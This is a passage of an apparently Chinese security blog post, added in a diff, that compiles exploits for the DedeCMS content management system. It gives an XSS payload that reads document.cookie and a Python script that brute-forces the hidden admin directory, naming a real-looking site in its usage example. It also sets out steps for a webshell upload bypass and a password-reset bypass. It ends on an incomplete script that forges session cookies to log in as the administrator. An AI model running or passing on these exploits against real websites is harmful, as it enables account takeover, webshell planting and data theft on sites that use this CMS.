+<p>在常用操作-文件式管理器处上传压缩文件到soft目录下，</p>
+<p>访问dede&#x2F;album_add.php，选择从ZIP压缩包中解压图片，发布预览</p>
+<hr>
+<h2 id="Dedecms-swf文件反射型xss"><a href="#Dedecms-swf文件反射型xss" class="headerlink" title="Dedecms swf文件反射型xss"></a>Dedecms swf文件反射型xss</h2><blockquote>
+<p>DedeCMS 5.7 &#x2F;images&#x2F;swfupload&#x2F;swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。</p>
+</blockquote>
+<p>Location: &#x2F;uploads&#x2F;images&#x2F;swfupload&#x2F;swfupload.swf</p>
+<p>payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>images<span class="token operator">/</span>swfupload<span class="token operator">/</span>swfupload<span class="token operator">.</span>swf<span class="token operator">?</span>movieName<span class="token operator">=</span><span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token operator">%</span><span class="token number">28</span>e<span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">!</span>window<span class="token operator">.</span>x<span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">&#123;</span>window<span class="token operator">.</span>x<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>alert<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>ian最帅<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// </span>
+<span class="token operator">/</span>images<span class="token operator">/</span>swfupload<span class="token operator">/</span>swfupload<span class="token operator">.</span>swf<span class="token operator">?</span>movieName<span class="token operator">=</span><span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token operator">%</span><span class="token number">28</span>e<span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">!</span>window<span class="token operator">.</span>x<span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">&#123;</span>window<span class="token operator">.</span>x<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>alert<span class="token operator">%</span><span class="token number">28</span>document<span class="token operator">.</span>cookie<span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="Dedecms找后台"><a href="#Dedecms找后台" class="headerlink" title="Dedecms找后台"></a>Dedecms找后台</h2><blockquote>
+<p>仅针对windows系统</p>
+</blockquote>
+<p>相关：</p>
+<p>common.inc.php大概148行左右</p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//0-sec.org/tags.php</span></span>
+
+post:
+
+dopost=save&amp;_FILES[b4dboy][tmp_name]=./de&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment">#coding:utf-8</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> itertools
+<span class="token keyword">from</span> random <span class="token keyword">import</span> choice
+<span class="token keyword">import</span> sys
+
+characters <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!#@-"</span>
+back_dir <span class="token operator">=</span> <span class="token string">""</span>
+
+show_message <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+check_message <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+valid_file <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">"_FILES[tools][tmp_name]"</span> <span class="token punctuation">:</span> <span class="token string">"./../&#123;p&#125;&lt;&lt;/images/adminico.gif"</span><span class="token punctuation">,</span>
+    <span class="token string">"_FILES[tools][name]"</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
+    <span class="token string">"_FILES[tools][size]"</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
+    <span class="token string">"_FILES[tools][type]"</span> <span class="token punctuation">:</span> <span class="token string">"image/gif"</span>
+<span class="token punctuation">&#125;</span>
+
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+
+                        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"</span><span class="token punctuation">,</span>
+                    <span class="token string">"Accept"</span><span class="token punctuation">:</span><span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="token punctuation">,</span>
+                    <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span><span class="token string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="token punctuation">,</span>
+                    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>
+                    <span class="token string">"Connection"</span><span class="token punctuation">:</span><span class="token string">"Close"</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Bute_Login</span><span class="token punctuation">:</span>
+        <span class="token keyword">global</span> headers
+        <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                self<span class="token punctuation">.</span>target <span class="token operator">=</span> target
+
+        <span class="token keyword">def</span> <span class="token function">Check</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">global</span> data<span class="token punctuation">,</span>check_message<span class="token punctuation">,</span>valid_file
+
+                File_Chek_List <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'/tags.php'</span><span class="token punctuation">,</span><span class="token string">'/include/vdimgck.php'</span><span class="token punctuation">,</span><span class="token string">'/m/list.php'</span><span class="token punctuation">,</span><span class="token string">'/m/view.php'</span><span class="token punctuation">,</span><span class="token string">'/member/config.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/advancedsearch.php'</span><span class="token punctuation">,</span>
+                                  <span class="token string">'/plus/arcmulti.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/bookfeedback.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/bookfeedback_js.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/car.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/carbuyaction.php'</span><span class="token punctuation">,</span>
+                                  <span class="token string">'/plus/comments_frame.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/count.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/digg_ajax.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/digg_frame.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/digg_frame.php'</span><span class="token punctuation">,</span>
+                                     <span class="token string">'/plus/disdls.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/diy.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/download.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/erraddsave.php'</span><span class="token punctuation">,</span>
+                                     <span class="token string">'/plus/feedback.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/feedback_ajax.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/flink.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/flink.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/flink_add.php'</span><span class="token punctuation">,</span>
+                                     <span class="token string">'/plus/freelist.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/heightsearch.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/list.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/mytag_js.php'</span><span class="token punctuation">,</span>
+                                     <span class="token string">'/plus/posttocar.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/qrcode.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/recommend.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/rss.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/search.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/showphoto.php'</span><span class="token punctuation">,</span>
+                                     <span class="token string">'/plus/stow.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/view.php'</span><span class="token punctuation">,</span><span class="token string">'/plus/vote.php'</span><span class="token punctuation">,</span><span class="token string">'/special/index.php'</span><span class="token punctuation">]</span>
+                <span class="token keyword">for</span> filename <span class="token keyword">in</span> File_Chek_List<span class="token punctuation">:</span>
+                        <span class="token keyword">try</span><span class="token punctuation">:</span>
+                                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>target<span class="token operator">+</span>filename<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+                                <span class="token comment">#print self.target+filename+"--->"+res.text</span>
+                                <span class="token keyword">if</span> <span class="token string">"Upload filetype not allow !"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text <span class="token keyword">and</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+                                        valid_file<span class="token punctuation">.</span>append<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
+                        <span class="token keyword">except</span><span class="token punctuation">:</span>
+                                <span class="token keyword">pass</span>
+                <span class="token comment">#print valid_file</span>
+                <span class="token comment">#print valid_file</span>
+                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>valid_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                        <span class="token keyword">if</span> <span class="token string">"/tags.php"</span> <span class="token keyword">in</span> valid_file<span class="token punctuation">:</span>
+                                <span class="token keyword">for</span> i <span class="token keyword">in</span> valid_file<span class="token punctuation">:</span>
+                                        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">"/tags.php"</span><span class="token punctuation">:</span>
+                                                <span class="token keyword">return</span> i
+                        <span class="token keyword">else</span><span class="token punctuation">:</span>
+                                file_name <span class="token operator">=</span> choice<span class="token punctuation">(</span>valid_file<span class="token punctuation">)</span>
+                                <span class="token keyword">return</span> file_name
+                <span class="token keyword">else</span><span class="token punctuation">:</span>
+                        <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+        <span class="token keyword">def</span> <span class="token function">Bute</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                f_name <span class="token operator">=</span> self<span class="token punctuation">.</span>Check<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token comment">#print f_name</span>
+                <span class="token keyword">if</span> f_name <span class="token operator">!=</span> <span class="token boolean">False</span><span class="token punctuation">:</span>
+                        <span class="token keyword">if</span> f_name <span class="token operator">==</span> <span class="token string">"/tags.php"</span><span class="token punctuation">:</span>
+                                prefix <span class="token operator">=</span> <span class="token string">"./"</span>
+                        <span class="token keyword">else</span><span class="token punctuation">:</span>
+                                prefix <span class="token operator">=</span> <span class="token string">"./../"</span>
+                        flag <span class="token operator">=</span> <span class="token number">0</span>
+                        <span class="token keyword">global</span> characters<span class="token punctuation">,</span>back_dir<span class="token punctuation">,</span>data<span class="token punctuation">,</span>check_message
+                        <span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        
+                                <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
+                                        <span class="token keyword">break</span>
+                                <span class="token keyword">for</span> pre <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>characters<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                                        pre <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>pre<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                                        data<span class="token punctuation">[</span><span class="token string">"_FILES[tools][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"_FILES[tools][tmp_name]"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token operator">=</span>pre<span class="token punctuation">)</span>
+                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"testing"</span><span class="token punctuation">,</span>pre<span class="token punctuation">)</span>
+                                        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>target<span class="token operator">+</span>f_name<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+                                        <span class="token keyword">if</span> <span class="token string">"Upload filetype not allow !"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">and</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+                                                flag <span class="token operator">=</span> <span class="token number">1</span>
+                                                back_dir <span class="token operator">=</span> pre
+                                                data<span class="token punctuation">[</span><span class="token string">"_FILES[tools][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"%s&#123;p&#125;&lt;&lt;/images/adminico.gif"</span><span class="token operator">%</span>prefix
+                                                <span class="token keyword">break</span>
+                                        <span class="token keyword">else</span><span class="token punctuation">:</span>
+                                                data<span class="token punctuation">[</span><span class="token string">"_FILES[tools][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"%s&#123;p&#125;&lt;&lt;/images/adminico.gif"</span><span class="token operator">%</span>prefix
+                        <span class="token comment">#print("[+] 前缀为：",back_dir)</span>
+                        flag <span class="token operator">=</span> <span class="token number">0</span>
+                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                                <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
+                                        <span class="token keyword">break</span>
+                                <span class="token keyword">for</span> ch <span class="token keyword">in</span> characters<span class="token punctuation">:</span>
+                                        <span class="token keyword">if</span> ch <span class="token operator">==</span> characters<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+                                                flag <span class="token operator">=</span> <span class="token number">1</span>
+                                                <span class="token keyword">break</span>
+                                        data<span class="token punctuation">[</span><span class="token string">"_FILES[tools][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"_FILES[tools][tmp_name]"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token operator">=</span>back_dir<span class="token operator">+</span>ch<span class="token punctuation">)</span>
+                                        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>target<span class="token operator">+</span>f_name<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+                                        <span class="token keyword">if</span> <span class="token string">"Upload filetype not allow !"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">and</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+                                                back_dir <span class="token operator">+=</span> ch
+                                                <span class="token comment">#print("[+] ",back_dir)</span>
+                                                data<span class="token punctuation">[</span><span class="token string">"_FILES[tools][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"%s&#123;p&#125;&lt;&lt;/images/adminico.gif"</span><span class="token operator">%</span>prefix
+                                                <span class="token keyword">break</span>
+                                        <span class="token keyword">else</span><span class="token punctuation">:</span>
+                                                data<span class="token punctuation">[</span><span class="token string">"_FILES[tools][tmp_name]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"%s&#123;p&#125;&lt;&lt;/images/adminico.gif"</span><span class="token operator">%</span>prefix
+                        show_message<span class="token punctuation">[</span><span class="token string">'Login_url'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>target<span class="token operator">+</span><span class="token string">"/%s"</span><span class="token operator">%</span>back_dir
+
+                        <span class="token keyword">print</span> show_message
+                        <span class="token keyword">return</span> show_message
+                <span class="token keyword">else</span><span class="token punctuation">:</span>
+                        check_message<span class="token punctuation">[</span><span class="token string">'Enumerate'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>
+                        <span class="token keyword">print</span> check_message
+                        <span class="token keyword">return</span> check_message
+
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        N <span class="token operator">=</span> Bute_Login<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        N<span class="token punctuation">.</span>Bute<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token triple-quoted-string string">'''
+usage:        python .\dede_login.py -u [url]http://www.chuheautism.com[/url]
+output:
+                ('testing', 'a')
+                ('testing', 'b')
+                ('testing', 'c')
+                &#123;'Login_url': 'http://www.chuheautism.com/cha'&#125;
+
+'''</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-u"</span><span class="token punctuation">:</span>
+                main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="（CVE-2018-20129）Dedecms前台文件上传漏洞"><a href="#（CVE-2018-20129）Dedecms前台文件上传漏洞" class="headerlink" title="（CVE-2018-20129）Dedecms前台文件上传漏洞"></a>（CVE-2018-20129）Dedecms前台文件上传漏洞</h2><blockquote>
+<p>管理员用户前台可以绕过限制上传shell</p>
+</blockquote>
+<p>相关：</p>
+<p>处理文件在&#x2F;include&#x2F;dialog&#x2F;select_images_post.php</p>
+<p>上传文件存在全局过滤&#x2F;include&#x2F;uploadsafe.inc.php</p>
+<p>poc：</p>
+<p>登录并进入member&#x2F;article_add.php发布文章，选择下面的富文本编辑器插入图片，选择好shell并上传抓包</p>
+<p>文件名修改为3.jpg.p*hp与content-type，即可返回shell地址</p>
+<hr>
+<h2 id="（SSV-97074）DeDecms-前台任意用户密码修改"><a href="#（SSV-97074）DeDecms-前台任意用户密码修改" class="headerlink" title="（SSV-97074）DeDecms 前台任意用户密码修改"></a>（SSV-97074）DeDecms 前台任意用户密码修改</h2><blockquote>
+<p>在用户密码重置功能处，php存在弱类型比较，导致如果用户没有设置密保问题的情况下可以绕过验证密保问题，直接修改密码(管理员账户默认不设置密保问题)。值得注意的是修改的密码是member表中的密码，即使修改了管理员密码也是member表中的管理员密码，仍是无法进入管理</p>
+</blockquote>
+<p>poc：</p>
+<p>在找回密码处，点击通过安全问题取回</p>
+<p>填写信息并抓包，修改id和userid为想要重置密码的对象，再加上以上分析内容，发包即可得到修改密码url</p>
+<p>进入该url，修改密码</p>
+<hr>
+<h2 id="（SSV-97087）DeDecms-任意用户登录"><a href="#（SSV-97087）DeDecms-任意用户登录" class="headerlink" title="（SSV-97087）DeDecms 任意用户登录"></a>（SSV-97087）DeDecms 任意用户登录</h2><blockquote>
+<p>dedecms的会员模块的身份认证使用的是客户端session，在Cookie中写入用户ID并且附上ID__ckMd5，用做签名。主页存在逻辑漏洞，导致可以返回指定uid的ID的Md5散列值。原理上可以伪造任意用户登录。</p>
+</blockquote>
+<p>poc：</p>
+<p>先从member&#x2F;index.php中获取伪造的DedeUserID和它对于的md5，使用它登录，访问member&#x2F;index.php?uid&#x3D;0000001并抓包(注意cookie中last_vid值应该为空)</p>
+<p>获取last_vid和last_vid_ckMd5，拿去当做DeDeUserID</p>
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    dede_host <span class="token operator">=</span> <span class="token string">"http://127.0.0.1/"</span>
+    oldpwd <span class="token operator">=</span> <span class="token string">'123456'</span>
+    newpwd <span class="token operator">=</span> <span class="token string">"cnvdcnvd"</span>
+    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token string">'系统关闭了会员功能'</span> <span class="token keyword">in</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>dede_host <span class="token operator">+</span> <span class="token string">'member/reg_new.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+        exit<span class="token punctuation">(</span><span class="token string">'The system has closed the member function .Can not attack !!!'</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"The system opened the membership function, I wish you good luck  !!"</span>
+
+    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Referer"</span><span class="token punctuation">:</span> dede_host <span class="token operator">+</span> <span class="token string">"member/reg_new.php"</span><span class="token punctuation">&#125;</span>
+    rs <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>dede_host <span class="token operator">+</span> <span class="token string">'include/vdimgck.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content
+    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.jpg'</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>
+    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>rs<span class="token punctuation">)</span>
+    <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    vdcode <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"Please enter the registration verification code : "</span><span class="token punctuation">)</span>
+
+    userid <span class="token operator">=</span> <span class="token string">'0000001'</span>
+    uname <span class="token operator">=</span> <span class="token string">'0000001'</span>
+    userpwd <span class="token operator">=</span> <span class="token string">'123456'</span>
+
+
+    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0)"</span><span class="token punctuation">,</span>
+               <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span>
+    data <span class="token operator">=</span> <span class="token string">"dopost=regbase&amp;step=1&amp;mtype=%E4%B8%AA%E4%BA%BA&amp;mtype=%E4%B8%AA%E4%BA%BA&amp;userid=&#123;userid&#125;&amp;uname=&#123;uname&#125;&amp;userpwd=&#123;userpwd&#125;&amp;userpwdok=&#123;userpwd&#125;&amp;email=0000001%400000001.com&amp;safequestion=0&amp;safeanswer=&amp;sex=%E7%94%B7&amp;vdcode=&#123;vdcode&#125;&amp;agree="</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
+        userid<span class="token operator">=</span>userid<span class="token punctuation">,</span> uname<span class="token operator">=</span>uname<span class="token punctuation">,</span> userpwd<span class="token operator">=</span>userpwd<span class="token punctuation">,</span> vdcode<span class="token operator">=</span>vdcode<span class="token punctuation">)</span>
+    rs <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>dede_host <span class="token operator">+</span> <span class="token string">'/member/reg_new.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"验证码错误"</span> <span class="token keyword">in</span> rs<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+        exit<span class="token punctuation">(</span><span class="token string">"Verification code error, account registration failed"</span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> <span class="token string">'注册成功'</span> <span class="token keyword">in</span> rs<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">'registration success !!'</span>
+
+    rs <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>dede_host <span class="token operator">+</span> <span class="token string">"/member/index.php?uid=&#123;userid&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>userid<span class="token operator">=</span>userid<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"资料尚未通过审核"</span> <span class="token keyword">in</span> rs<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+        exit<span class="token punctuation">(</span><span class="token string">"User information has not been approved !!!"</span><span class="token punctuation">)</span>  <span class="token comment"># 会员使用权限开通状态(-10 邮件验证 -1 手工审核, 0 没限制)：</span>
+    searchObj <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'last_vid__ckMd5=(.*?);'</span><span class="token punctuation">,</span> rs<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>M <span class="token operator">|</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>
+    last_vid__ckMd5 <span class="token operator">=</span> searchObj<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'DedeUserID'</span><span class="token punctuation">]</span> <span class="token operator">=</span> userid
+    s<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'DedeUserID__ckMd5'</span><span class="token punctuation">]</span> <span class="token operator">=</span> last_vid__ckMd5
+    rs <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>dede_host <span class="token operator">+</span> <span class="token string">"/member/index.php"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"class="</span>userName<span class="token string">">admin&lt;/a>"</span> <span class="token keyword">in</span> rs<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Administrator login successful !!"</span>
+
+    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Referer"</span><span class="token punctuation">:</span> dede_host <span class="token operator">+</span> <span class="token string">"member/edit_baseinfo.php"</span><span class="token punctuation">&#125;</span>
+    rs <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>dede_host <span class="token operator">+</span> <span class="token string">'include/vdimgck.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content
+    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'2.jpg'</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>
+    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>rs<span class="token punctuation">)</span>
+    <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
